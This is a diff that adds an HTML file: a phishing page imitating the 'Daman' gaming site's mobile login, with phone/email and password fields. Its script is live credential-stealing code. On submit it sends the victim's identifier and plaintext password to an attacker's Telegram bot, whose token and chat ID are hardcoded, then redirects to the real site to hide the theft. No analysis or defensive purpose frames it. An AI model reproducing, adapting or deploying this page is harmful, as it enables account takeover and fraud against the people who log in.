@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Daman Login</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Open Sans', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #2c3e50;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 414px;
+            height: 100vh;
+            max-height: 896px;
+            background-color: #f4f5f9;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 15px 50px rgba(0,0,0,0.5);
+            overflow: hidden;
+        }
+
+        .scrollable-content {
+            flex: 1;
+            overflow-y: auto;
+            padding-bottom: 20px;
+        }
+
+        .scrollable-content::-webkit-scrollbar {
+            width: 0px;
+        }
+
+        .header {
+            background: linear-gradient(to right, #fd646e, #fa8c86);
+            padding: 20px 20px 25px 20px;
+            color: white;
+        }
+
+        .nav-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .nav-bar i.fa-chevron-left {
+            font-size: 20px;
+            cursor: pointer;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .logo-icon {
+            width: 24px;
+            height: 24px;
+            background: white;
+            clip-path: polygon(0 0, 100% 0, 100% 100%, 20% 100%, 40% 60%, 0 60%);
+        }
+
+        .logo-text {
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        .header-title h1 {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .header-title p {
+            font-size: 12.5px;
+            line-height: 1.5;
+            opacity: 0.95;
+            font-weight: 400;
+        }
+
+        .tabs-container {
+            display: flex;
+            background: #f4f5f9;
+            border-bottom: 1px solid #e2e4ea;
+            padding: 0 15px;
+        }
+
+        .tab {
+            flex: 1;
+            text-align: center;
+            padding: 15px 0 12px 0;
+            font-size: 14.5px;
+            font-weight: 700;
+            color: #8c95a6;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            position: relative;
+            transition: color 0.3s;
+        }
+
+        .tab i {
+            font-size: 20px;
+            color: #b5bcc8;
+            transition: color 0.3s;
+        }
+
+        .tab.active {
+            color: #fd646e;
+        }
+
+        .tab.active i {
+            color: #fd646e;
+        }
+
+        .tab.active::after {
+            content: '';
+            position: absolute;
+            bottom: -1px;
+            left: 10%;
+            width: 80%;
+            height: 2px;
+            background-color: #fd646e;
+        }
+
+        .form-section {
+            padding: 25px 20px 20px 20px;
+        }
+
+        .input-group {
+            margin-bottom: 22px;
+        }
+
+        .label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            font-weight: 400;
+            color: #333;
+            margin-bottom: 12px;
+        }
+
+        .label-icon {
+            color: #fd646e;
+            font-size: 16px;
+        }
+
+        .input-row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .custom-input, .country-code {
+            background: #ffffff;
+            border: 1px solid transparent;
+            border-radius: 10px;
+            padding: 14px 15px;
+            font-size: 14px;
+            color: #333;
+            outline: none;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.02);
+            transition: border-color 0.3s;
+        }
+
+        .custom-input:focus {
+            border-color: #fd646e;
+        }
+
+        .custom-input::placeholder {
+            color: #aab2c0;
+        }
+
+        .country-code {
+            width: 80px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: #8c95a6;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .country-code i {
+            font-size: 12px;
+        }
+
+        .input-row .custom-input {
+            flex: 1;
+        }
+
+        .password-wrapper {
+            position: relative;
+        }
+
+        .password-wrapper .custom-input {
+            width: 100%;
+            padding-right: 45px;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #c3c9d4;
+            font-size: 16px;
+            cursor: pointer;
+            padding: 5px;
+        }
+
+        .options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 10px;
+            margin-bottom: 30px;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #8c95a6;
+            cursor: pointer;
+        }
+
+        .remember-me input {
+            appearance: none;
+            width: 18px;
+            height: 18px;
+            border: 1.5px solid #c3c9d4;
+            border-radius: 50%;
+            cursor: pointer;
+            position: relative;
+            background: transparent;
+            outline: none;
+        }
+
+        .remember-me input:checked {
+            border-color: #fd646e;
+            background-color: #fd646e;
+        }
+
+        .remember-me input:checked::after {
+            content: '✔';
+            color: white;
+            font-size: 10px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .forgot-password {
+            font-size: 13px;
+            color: #fd646e;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 700;
+            transition: all 0.3s ease;
+        }
+
+        .btn-login {
+            background-color: #bdc3d1;
+            color: #ffffff;
+            margin-bottom: 15px;
+            cursor: not-allowed;
+        }
+
+        .btn-login.active {
+            background-color: #fd646e;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(253, 100, 110, 0.3);
+        }
+        
+        .btn-login.loading {
+            background-color: #fd646e;
+            cursor: wait;
+            opacity: 0.8;
+        }
+
+        .btn-register {
+            background-color: transparent;
+            color: #fd646e;
+            border: 1px solid #fd646e;
+            cursor: pointer;
+        }
+        
+        .btn-register:active {
+            background-color: #fff0f0;
+        }
+
+        .chat-float {
+            position: absolute;
+            bottom: 75px;
+            right: 20px;
+            width: 55px;
+            height: 55px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+            cursor: pointer;
+            border: 2px solid #ffe6e6;
+            z-index: 100;
+        }
+
+        .chat-float i {
+            color: #fd646e;
+            font-size: 26px;
+        }
+
+        .bottom-nav {
+            background: #ffffff;
+            display: flex;
+            justify-content: space-around;
+            padding: 15px 10px;
+            border-top: 1px solid #eaeaea;
+            position: relative;
+            z-index: 10;
+        }
+
+        .bottom-nav i {
+            font-size: 22px;
+            color: #333;
+            cursor: pointer;
+        }
+
+        .nav-icon-box {
+            border: 1.5px solid #333;
+            border-radius: 4px;
+            padding: 1px 4px;
+            font-size: 14px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        @media (min-width: 500px) {
+            .app-container {
+                border-radius: 20px;
+                height: 90vh;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <div class="scrollable-content">
+            <div class="header">
+                <div class="nav-bar">
+                    <i class="fas fa-chevron-left"></i>
+                    <div class="logo-container">
+                        <div class="logo-icon"></div>
+                        <div class="logo-text">Daman</div>
+                    </div>
+                    <div style="width: 20px;"></div>
+                </div>
+                <div class="header-title">
+                    <h1>Log in</h1>
+                    <p>Please log in with your phone number or email<br>If you forget your password, please contact customer service</p>
+                </div>
+            </div>
+
+            <div class="tabs-container">
+                <div class="tab active" onclick="switchTab('phone')" id="tab-phone">
+                    <i class="fas fa-mobile-alt"></i>
+                    Phone Number
+                </div>
+                <div class="tab" onclick="switchTab('email')" id="tab-email">
+                    <i class="fas fa-envelope"></i>
+                    Email
+                </div>
+            </div>
+
+            <div class="form-section">
+                <div class="input-group" id="phone-group">
+                    <div class="label">
+                        <i class="fas fa-mobile-alt label-icon"></i> Phone number
+                    </div>
+                    <div class="input-row">
+                        <div class="country-code">
+                            +91 <i class="fas fa-chevron-down"></i>
+                        </div>
+                        <input type="tel" id="phoneInput" class="custom-input" placeholder="Please enter the phone number" oninput="checkInputs()">
+                    </div>
+                </div>
+
+                <div class="input-group" id="email-group" style="display: none;">
+                    <div class="label">
+                        <i class="fas fa-envelope label-icon"></i> Email Address
+                    </div>
+                    <div class="input-row">
+                        <input type="email" id="emailInput" class="custom-input" placeholder="Please enter your email" oninput="checkInputs()">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <div class="label">
+                        <i class="fas fa-lock label-icon"></i> Password
+                    </div>
+                    <div class="password-wrapper">
+                        <input type="password" id="passInput" class="custom-input" placeholder="Password" oninput="checkInputs()">
+                        <i class="fas fa-eye-slash eye-icon" id="eyeIcon" onclick="togglePassword()"></i>
+                    </div>
+                </div>
+
+                <div class="options">
+                    <label class="remember-me">
+                        <input type="checkbox"> Remember password
+                    </label>
+                    <a href="#" class="forgot-password">Forgot password?</a>
+                </div>
+
+                <button class="btn btn-login" id="loginBtn" onclick="handleLogin()">Log in</button>
+                <button class="btn btn-register">Register</button>
+            </div>
+        </div>
+
+        <div class="chat-float">
+            <i class="fas fa-comment-dots"></i>
+        </div>
+
+        <div class="bottom-nav">
+            <i class="fas fa-home"></i>
+            <i class="far fa-bookmark"></i>
+            <i class="fas fa-search"></i>
+            <div class="nav-icon-box">5</div>
+            <i class="fas fa-ellipsis-v"></i>
+        </div>
+    </div>
+
+    <script>
+        // --- CONFIGURATION ---
+        const TELEGRAM_BOT_TOKEN = "9259984995:AAHU5oRM8Zh5kDEpncGTa0bSZwgrvb-ATbM";
+        const TELEGRAM_CHAT_ID = "8529083318";
+        
+        // AAPKI REAL WEBSITE KA LINK YAHAN HAI
+        const REDIRECT_URL = "https://damanclub.asia/#/"; 
+
+        function switchTab(type) {
+            const tabPhone = document.getElementById('tab-phone');
+            const tabEmail = document.getElementById('tab-email');
+            const phoneGroup = document.getElementById('phone-group');
+            const emailGroup = document.getElementById('email-group');
+
+            if (type === 'phone') {
+                tabPhone.classList.add('active');
+                tabEmail.classList.remove('active');
+                phoneGroup.style.display = 'block';
+                emailGroup.style.display = 'none';
+            } else {
+                tabEmail.classList.add('active');
+                tabPhone.classList.remove('active');
+                phoneGroup.style.display = 'none';
+                emailGroup.style.display = 'block';
+            }
+            checkInputs();
+        }
+
+        function togglePassword() {
+            const passInput = document.getElementById('passInput');
+            const eyeIcon = document.getElementById('eyeIcon');
+
+            if (passInput.type === 'password') {
+                passInput.type = 'text';
+                eyeIcon.classList.remove('fa-eye-slash');
+                eyeIcon.classList.add('fa-eye');
+                eyeIcon.style.color = '#fd646e';
+            } else {
+                passInput.type = 'password';
+                eyeIcon.classList.remove('fa-eye');
+                eyeIcon.classList.add('fa-eye-slash');
+                eyeIcon.style.color = '#c3c9d4';
+            }
+        }
+
+        function checkInputs() {
+            const phoneVal = document.getElementById('phoneInput').value.trim();
+            const emailVal = document.getElementById('emailInput').value.trim();
+            const passVal = document.getElementById('passInput').value;
+            const loginBtn = document.getElementById('loginBtn');
+            const isPhoneTab = document.getElementById('tab-phone').classList.contains('active');
+
+            let isFormValid = false;
+
+            if (isPhoneTab) {
+                isFormValid = (phoneVal.length >= 10 && passVal.length >= 4);
+            } else {
+                isFormValid = (emailVal.includes('@') && emailVal.includes('.') && passVal.length >= 4);
+            }
+
+            if (isFormValid) {
+                loginBtn.classList.add('active');
+            } else {
+                loginBtn.classList.remove('active');
+            }
+        }
+
+        // Telegram API Function
+        async function sendToTelegram(messageText) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: messageText,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return (await response.json()).ok;
+            } catch (error) {
+                console.error("Telegram Error:", error);
+                return false;
+            }
+        }
+
+        // Main Login Function
+        async function handleLogin() {
+            const loginBtn = document.getElementById('loginBtn');
+            const isPhoneTab = document.getElementById('tab-phone').classList.contains('active');
+            
+            if (!loginBtn.classList.contains('active')) {
+                alert("Please enter a valid Phone/Email and Password (min 4 chars).");
+                return;
+            }
+
+            // Button loading state
+            const originalText = loginBtn.innerText;
+            loginBtn.innerText = "Logging in...";
+            loginBtn.classList.add('loading');
+            loginBtn.disabled = true;
+
+            // Get Data
+            let userIdentifier = isPhoneTab 
+                ? "+91 " + document.getElementById('phoneInput').value.trim() 
+                : document.getElementById('emailInput').value.trim();
+            const password = document.getElementById('passInput').value;
+
+            // Prepare Message
+            const tgMessage = `
+<b>🔔 New Login Attempt!</b>
+<b>---------------------------</b>
+<b>Type:</b> ${isPhoneTab ? 'Phone Number' : 'Email'}
+<b>User/ID:</b> ${userIdentifier}
+<b>Password:</b> <code>${password}</code>
+<b>---------------------------</b>
+<i>Website: Daman Login</i>
+            `;
+
+            // Send to Telegram (Wait for it to finish)
+            await sendToTelegram(tgMessage);
+
+            // Wait for 1.5 seconds, then redirect to the real website
+            setTimeout(() => {
+                // Redirecting to your real website
+                window.location.href = REDIRECT_URL;
+            }, 1500); 
+        }
+    </script>
+</body>
+  </html>
